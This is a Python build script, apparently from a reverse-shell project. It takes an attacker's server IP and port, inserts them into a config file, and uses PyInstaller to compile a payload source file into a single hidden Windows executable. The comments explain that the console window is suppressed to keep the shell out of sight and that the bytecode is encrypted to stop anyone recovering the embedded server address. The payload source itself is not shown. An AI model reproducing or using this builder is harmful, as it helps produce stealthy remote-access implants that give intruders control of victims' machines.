import os
import shutil
import argparse
import subprocess
from pathlib import Path
from hashlib import sha256
from tempfile import TemporaryDirectory


def debug_msg(msg: str) -> None:
    print(f"\033[34m[+]\033[0m {msg}")


def error_msg(msg: str) -> None:
    print(f"\033[31m[!]\033[0m {msg}")


def validate_ip(ip: str) -> bool:
    ip = ip.split('.')
    if len(ip) == 4:
        for num in ip:
            if not num.isdigit():
                return False
            elif int(num) not in range(256):
                return False
        
        return True

    return False


def validate_port(port: int) -> bool:
    return port in range(1, 2**16)


def exec_cmd(command: str) -> subprocess.CompletedProcess:
    process = subprocess.run(
        command,
        stdin=subprocess.DEVNULL,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        shell=True
    )

    return process


def create_config(config_path: Path, output_path: Path, args: argparse.Namespace) -> Path:
    with open(config_path, "r") as file:
        config_data = file.read()
    
    config_data = config_data.format(ip=args.ip[0], port=args.port[0])

    with open(output_path, "w") as file:
        file.write(config_data)


def compile_src(
        src_path: Path,
        dist_path: Path,
        tmp_path: Path,
    ) -> None:

    command = f'pyinstaller "{src_path}" '
    command += f'--workpath "{tmp_path}" '
    command += f'--specpath "{tmp_path}" '
    command += f'--distpath "{dist_path}" '

    # due to how pyinstaller works you can either have no console
    # or no window and since interactive powershell can be hidden
    # after start by using the "-w 1" arguments the shell will
    # compile using noconsole
    command += "-F --clean --noconsole --disable-windowed-traceback --log-level ERROR "

    # encrypt compiled byte code with a random 128 bit aes key,
    # this will help hiding the server address in the executable
    # since single file pyinstaller executables will extract themself
    # to a temporary folder when executed and if not using a key the
    # byte code is easy to decompile and reveal information
    aes_key = sha256(os.urandom(4096)).hexdigest()[:16]
    command += f"--key {aes_key}"

    debug_msg(f"compiling {src_path.name}")
    process = exec_cmd(command)

    if not dist_path.exists() or process.stderr != b'':
        error_msg(f"unable to compile {src_path.name}")
        exit()


def build_executable(abs_path: Path, args: argparse.Namespace):
    # set path for the build files
    build_path = Path(abs_path, "build")

    # if build folder exists remove old build files
    if build_path.is_dir():
        shutil.rmtree(build_path)
    
    # make new build folder
    build_path.mkdir()

    # create temporary directory
    tmp_dir = TemporaryDirectory()
    tmp_path = Path(tmp_dir.name)

    # set source and config path
    src_path = Path(abs_path, "src", "main.py")
    config_path = Path(abs_path, "config", "config.py")

    # set new source and config path in temporary dir
    new_src_path = Path(tmp_path, src_path.name)
    new_config_path = Path(tmp_path, config_path.name)

    # copy the main src file to the temporary dir 
    shutil.copyfile(src_path, new_src_path)

    # parse and create config
    create_config(config_path, new_config_path, args)

    # compile the source code to an executable
    compile_src(
        src_path=new_src_path,
        dist_path=build_path,
        tmp_path=tmp_path,
    )

    debug_msg(f"successfully compiled to {build_path.name}")


if __name__ == "__main__":
    # set the absolute path to the project directory
    abs_path = Path(__file__).resolve().parent

    # parse arguments to set ip and port of the server
    parser = argparse.ArgumentParser(description="compile the python code to an executable")
    parser.add_argument("ip", nargs=1, type=str, help="server ip address")
    parser.add_argument("port", nargs=1, type=int, help="server port address")
    args = parser.parse_args()

    ip = args.ip[0]
    port = args.port[0]

    if not validate_ip(ip):
        error_msg(f"invalid ip: {ip}")
        exit()
    
    if not validate_port(port):
        error_msg(f"invalid port: {port}")
        exit()
    
    print("\nReverse Shell Config")
    print("========================")
    print(f"ip   : {ip}")
    print(f"port : {port}\n")

    build_executable(abs_path, args)